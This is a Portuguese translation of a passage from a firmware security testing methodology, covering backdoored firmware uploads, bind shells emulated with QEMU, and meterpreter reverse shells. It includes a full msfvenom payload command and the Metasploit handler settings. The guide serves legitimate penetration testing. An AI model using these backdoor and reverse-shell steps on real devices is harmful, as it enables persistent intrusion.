### Esta página foi copiada de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Tente **fazer upload de firmware personalizado e/ou binários compilados** para encontrar falhas de integridade ou de assinatura. Por exemplo, compile um backdoor bind shell que inicie na inicialização usando os seguintes passos.

1. Extraia o firmware com o firmware-mod-kit (FMK)
2. Identifique a arquitetura do firmware de destino e a ordem dos bytes
3. Construa um compilador cruzado com o Buildroot ou use outros métodos que se adequem ao seu ambiente
4. Use o compilador cruzado para construir o backdoor
5. Copie o backdoor para o firmware extraído /usr/bin
6. Copie o binário QEMU apropriado para o rootfs do firmware extraído
7. Emule o backdoor usando chroot e QEMU
8. Conecte-se ao backdoor via netcat
9. Remova o binário QEMU do rootfs do firmware extraído
10. Empacote o firmware modificado com o FMK
11. Teste o firmware com backdoor emulado com o firmware analysis toolkit (FAT) e conecte-se ao IP e porta do backdoor de destino usando netcat

Se um shell raiz já foi obtido por meio de análise dinâmica, manipulação de bootloader ou meios de teste de segurança de hardware, tente executar binários maliciosos pré-compilados, como implantes ou shells reversos. Considere o uso de ferramentas de carga útil/implante automatizadas usadas para estruturas de comando e controle (C\&C). Por exemplo, o framework Metasploit e o 'msfvenom' podem ser aproveitados usando os seguintes passos.

1. Identifique a arquitetura do firmware de destino e a ordem dos bytes
2. Use o `msfvenom` para especificar a carga útil de destino apropriada (-p), o IP do host do atacante (LHOST=), o número da porta de escuta (LPORT=), o tipo de arquivo (-f), a arquitetura (--arch), a plataforma (--platform linux ou windows) e o arquivo de saída (-o). Por exemplo, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transfira a carga útil para o dispositivo comprometido (por exemplo, execute um servidor web local e use wget/curl para transferir a carga útil para o sistema de arquivos) e certifique-se de que a carga útil tenha permissões de execução
4. Prepare o Metasploit para lidar com solicitações de entrada. Por exemplo, inicie o Metasploit com msfconsole e use as seguintes configurações de acordo com a carga útil acima: use exploit/multi/handler,
   * `set payload linux/armle/meterpreter_reverse_tcp`
   * `set LHOST 192.168.1.245 #IP do host do atacante`
   * `set LPORT 445 #pode ser qualquer porta não utilizada`
   * `set ExitOnSession false`
   * `exploit -j -z`
5. Execute o shell reverso meterpreter no dispositivo comprometido
6. Observe as sessões do meterpreter abertas
7. Realize atividades de pós-exploração

Se possível, identifique uma vulnerabilidade nos scripts de inicialização para obter acesso persistente a um dispositivo em reinicializações. Tais vulnerabilidades surgem quando os scripts de inicialização fazem referência, [link simbolicamente](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data) ou dependem de código localizado em locais montados não confiáveis, como cartões SD e volumes flash usados para armazenar dados fora dos sistemas de arquivos raiz.
